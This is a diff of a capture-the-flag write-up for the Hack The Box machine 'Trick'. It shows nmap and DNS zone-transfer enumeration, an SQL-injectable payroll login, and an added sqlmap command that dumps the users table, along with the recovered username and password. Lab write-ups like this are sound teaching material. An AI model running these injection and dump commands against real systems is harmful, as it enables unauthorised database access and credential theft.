@@ -1,11 +1,11 @@
-# Enum
+# Nmap 
 ```
 22 - OpenSSH 7.9p1 Debian 10+deb10u2
 25 - Postfix
 53 - BIND "9.11.5-P4-5.1+deb10u7-Debian"
 80 - nginx 1.14.2 - unconfigured boostrap
 ```
-
+---
 ## DNS Enum
 ```
 (blnkn㉿Kolossus)-[~/sec/htb/machines/trick]─$ nslookup
@@ -33,34 +33,20 @@ trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604
  WHEN: Mon Jul 04 23:11:04 IST 2022
 ;; XFR size: 6 records (messages 1, bytes 231)
 ```
-
-[http://preprod-payroll.trick.htb](http://preprod-payroll.trick.htb) has a login page, which is vulnerable to SQli 
+---
+<a href="http://preprod-payroll.trick.htb" target="_blank">http://preprod-payroll.trick.htb</a>
+The preprod portal has a login page, which is vulnerable to SQli  
 ![sqli](./sqli.png)
 
+We now have access to the payroll portal, it might be worth testing the site for more SQLi vulns  
+After tryin sqlmap on various forms, the 'save deduction' form seems to be vulnerable   
+![save-deductions-form](./deductions.png)
 
 ```
-Administrator
-Enemigosss
-SuperGucciRainbowCake
+sqlmap -r save_deductions.req --batch --threads 10 -D payroll_db -T users --dump
 ```
 ```
-[22:18:05] [INFO] retrieved: information_schema
-[22:18:11] [INFO] retrieved: payroll_db
-
-[22:18:14] [INFO] retrieved: position
-[22:18:17] [INFO] retrieved: employee
-[22:18:20] [INFO] retrieved: department
-[22:18:23] [INFO] retrieved: payroll_items
-[22:18:28] [INFO] retrieved: attendance
-[22:18:31] [INFO] retrieved: employee_deductions
-[22:18:37] [INFO] retrieved: employee_allowances
-[22:18:41] [INFO] retrieved: users
-[22:18:43] [INFO] retrieved: deductions
-[22:18:46] [INFO] retrieved: payroll
-[22:18:49] [INFO] retrieved: allowances
-```
-```
-Database: payroll_db
+tabase: payroll_db
 Table: users
 [1 entry]
 +----+-----------+----------------+------+---------+---------+-----------------------+------------+
@@ -68,6 +54,4 @@ Table: users
 +----+-----------+----------------+------+---------+---------+-----------------------+------------+
 | 1  | 0         | Administrateur | 1    | <blank> | <blank> | SuperGucciRainbowCake | Enemigosss |
 +----+-----------+----------------+------+---------+---------+-----------------------+------------+
-```
-```
 ```
